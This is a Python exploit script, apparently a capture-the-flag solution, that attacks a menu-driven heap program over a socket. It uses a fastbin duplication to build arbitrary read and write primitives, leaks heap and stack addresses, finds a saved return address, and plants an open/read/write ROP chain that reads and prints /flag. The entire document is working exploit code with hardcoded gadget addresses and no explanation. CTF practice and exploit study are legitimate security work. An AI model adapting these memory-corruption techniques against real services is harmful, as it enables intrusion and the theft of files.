#!/usr/bin/env python3
import os
import socket
import struct
import sys
import time


host = sys.argv[1] if len(sys.argv) > 1 else '127.0.0.1'
port = int(sys.argv[2]) if len(sys.argv) > 2 else 8000

chunk_list = 0x6cf7e0
fake_chunk = chunk_list - 0x10
environ = 0x6ce780

pop_rsp = 0x401af0
pop_rdi = 0x401af6
pop_rsi = 0x401c17
pop_rdx = 0x443fd6
open_addr = 0x440980
read_addr = 0x4409e0
write_addr = 0x440a40
xchg_eax_edi = 0x409ed5
show_ret = 0x400c9e

mask = (1 << 64) - 1
buf = b''


def log(msg):
    print(msg, flush=True)
    if os.environ.get('TRACE_FILE'):
        with open(os.environ['TRACE_FILE'], 'a', encoding='utf-8') as f:
            f.write(msg + '\n')


def p64(x):
    return struct.pack('<Q', x & mask)


def p32(x):
    return struct.pack('<I', x & 0xffffffff)


def u64(x):
    return struct.unpack('<Q', x.ljust(8, b'\x00')[:8])[0]


def recvuntil(tag):
    global buf
    while tag not in buf:
        data = io.recv(0x1000)
        if not data:
            raise EOFError('closed while waiting for ' + repr(tag))
        buf += data
    pos = buf.index(tag) + len(tag)
    data = buf[:pos]
    buf = buf[pos:]
    return data


def recvn(size):
    global buf
    while len(buf) < size:
        data = io.recv(0x1000)
        if not data:
            raise EOFError('closed while reading')
        buf += data
    data = buf[:size]
    buf = buf[size:]
    return data


def cmd(choice):
    recvuntil(b'>')
    io.sendall(p32(choice))


def build(index, size, content=b''):
    return p64(index) + p64(size) + content.ljust(0x90, b'\x00')


def add(index, size):
    cmd(1)
    recvuntil(b'>')
    io.sendall(build(index, size))


def edit(index, size, content):
    cmd(2)
    recvuntil(b'>')
    io.sendall(build(index, size, b'ziran\x00'))
    recvuntil(b'starting to edit:\n')
    io.sendall(content)


def delete(index):
    cmd(3)
    recvuntil(b'>')
    io.sendall(build(index, 0))


def show(index, size):
    cmd(4)
    recvuntil(b'>')
    io.sendall(build(index, 0))
    recvuntil(b'leaking...\n')
    return recvn(size)


def set_chunk(index, addr):
    edit(12, (index + 1) * 8, b'A' * (index * 8) + p64(addr))


def arb_read(addr, size=0x100):
    set_chunk(0, addr)
    return show(0, size)


def arb_write(addr, data):
    set_chunk(1, addr)
    edit(1, len(data), data)


def leak_saved_ret(environ_addr):
    ret_slot = environ_addr - 0x1d0
    if u64(arb_read(ret_slot, 8)) == show_ret:
        return ret_slot

    for addr in range(environ_addr - 0x800, environ_addr + 0x100, 0x100):
        data = arb_read(addr, 0x100)
        off = data.find(p64(show_ret))
        if off != -1:
            return addr + off
    raise RuntimeError('saved return address not found')


def pwn():
    log('[*] fastbin dup')
    add(-0x101, 0x71)
    add(10, 0x60)
    delete(10)
    edit(10, 8, p64(fake_chunk))
    add(11, 0x60)
    add(12, 0x60)

    log('[*] build rw primitive')
    add(0, 0x100)
    add(20, 0x400)

    log('[*] leak heap/environ')
    heap = u64(arb_read(chunk_list + 20 * 8, 8))
    stack = u64(arb_read(environ, 8))
    log('[*] scan stack')
    ret_slot = leak_saved_ret(stack)

    print('[+] heap chunk = ' + hex(heap))
    print('[+] stack leak = ' + hex(stack))
    print('[+] ret slot   = ' + hex(ret_slot))

    path = heap + 0x180
    flag_buf = heap + 0x200

    # pop rsp pops three qwords after rsp, so the real ROP starts at heap+0x18
    rop = b'A' * 0x18
    rop += p64(pop_rdi) + p64(path)
    rop += p64(pop_rsi) + p64(0)
    rop += p64(open_addr)
    # use the fd returned by open, no need to guess whether it is 3
    rop += p64(xchg_eax_edi)
    rop += p64(pop_rsi) + p64(flag_buf)
    rop += p64(pop_rdx) + p64(0x80)
    rop += p64(read_addr)
    rop += p64(pop_rdi) + p64(1)
    rop += p64(pop_rsi) + p64(flag_buf)
    rop += p64(pop_rdx) + p64(0x80)
    rop += p64(write_addr)

    log('[*] write rop')
    for off in range(0, len(rop), 0x80):
        log('[*] write rop part ' + hex(off))
        arb_write(heap + off, rop[off:off + 0x80])
    log('[*] write path')
    arb_write(path, b'/flag\x00')

    log('[*] trigger')
    set_chunk(1, ret_slot)
    edit(1, 0x10, p64(pop_rsp) + p64(heap))

    time.sleep(0.3)
    data = b''
    try:
        while True:
            part = io.recv(0x1000)
            if not part:
                break
            data += part
    except socket.timeout:
        pass
    sys.stdout.buffer.write(data.rstrip(b'\x00'))


if __name__ == '__main__':
    log('[*] connect ' + host + ':' + str(port))
    io = socket.create_connection((host, port), timeout=5)
    io.settimeout(3)
    pwn()
